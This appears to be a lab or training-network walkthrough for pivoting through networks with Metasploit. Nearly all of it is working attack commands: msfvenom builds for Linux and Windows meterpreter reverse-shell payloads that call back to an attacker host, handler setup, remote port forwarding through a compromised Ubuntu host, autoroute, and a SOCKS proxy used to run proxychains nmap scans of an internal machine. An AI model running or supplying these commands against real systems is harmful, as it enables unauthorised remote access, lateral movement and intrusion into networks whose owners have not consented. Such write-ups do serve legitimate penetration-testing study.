# Attack Host 10.10.14.214
1. Create a payload to pop a meterperter reverse shell of the ubuntu host using msfvenom 
```
msfvenom -p linux/x64/meterpreter/reverse_tcp LHOST=10.10.14.214 -f elf -o backupjob LPORT=9443 
```
2. Transfer payload to Ubuntu
3. Open a listener using metasploit on our host machine using exploit/multi/handler listening on port 9443
```
use exploit/multi/handler
```
```
set payload linux/x64/meterpreter/reverse_tcp
```
```
set lhost 0.0.0.0
```
```
set lport 9443
```
```
run
```
4. Execute backupjob payload on the Ubuntu Pivot Host
5. Meterpreter Session of Ubuntu Host
6. Next we need forward all data on port 1234 to our host machine on our 8080, so that when we execute the next windows reverse shell payload to our ubuntu machine on port 1234, it will forward the data to our listener on port 8080
```
meterpreter > portfwd add -R -l 8080 -p 1234 -L 10.10.14.214
```
```
meterpreter > bg
```
```
exploit/multi/handler
```
```
set lhost 0.0.0.0
```
```
set lport 8080
```
```
set payload windows/x64/meterpreter/reverse_tcp
```
```
run
```
7. create a payload using msfvenom that will execute a reverse shell on port 1234 on the ubuntu machine, which will then forward the data to our listener on port 8080 when we execute it.
```
msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=172.16.8.120 LPORT=1234 -f exe -o script.exe
```
8. Transfer payload to Windows machine using Evil-WinRm for example
9. Execute script.exe
## Workflow
### Execute script.exe -> Send back a reverse shell on port 1234 on the Ubuntu Host -> Data on port 1234 sent to our host machine on port 8080 -> Meterpreter session of Windows Host

10. Next we need to add the 172.16.9.0/13 using autoroute to route the traffic to our meterpreter session. Make sure the output of the added route is via our host machine ip address which is 10.10.14.214 in our case (Ubuntu host Only visible to the Red Windows Host 172.16.9.0/23)
```
meterpreter > run autoroute -s 172.16.9.0/23
```
```
meterpreter > run autoroute -p
```
```
bg
```
11. Next we need to use socks_proxy via meterpreter in order to be able to use proxychains and target the ubuntu host machine 172.16.9.25. We will have to use socks version 4a and change the SRVPORT to 9060 (since we used 9050 in order to access the WinRM session previously) and change the socks4 port to 9060 in our proxychains.config file
```
use auxiliary/server/socks_proxy
```
```
set srvport 9060
```
```
set version4a
```
```
run
```
12. Starting the SOCKS proxy server
```
vim /etc/proxychains4.conf
```
```
socks4 127.0.0.1 9060
```
13. Now we can use proxychains and it will use our meterpreter session to proxy the data to the ubuntu host 172.16.9.25 
```
proxychains nmap -sT 172.16.9.25
```